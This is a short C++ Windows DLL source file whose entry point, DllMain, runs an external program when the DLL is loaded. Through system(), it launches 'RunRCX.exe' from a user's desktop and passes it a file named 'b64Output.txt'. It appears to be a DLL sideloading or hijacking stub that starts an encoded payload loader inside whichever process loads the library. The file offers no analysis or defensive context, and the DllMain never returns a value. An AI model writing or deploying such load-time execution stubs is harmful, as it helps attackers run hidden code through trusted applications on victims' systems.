// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <lm.h>
#include <iostream>
#include <fstream>

#pragma comment(lib, "netapi32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    system("C:\\Users\\ShiguruiMuerto\\Desktop\\RunRCX.exe C:\\Users\\ShiguruiMuerto\\Desktop\\b64Output.txt 1");
}

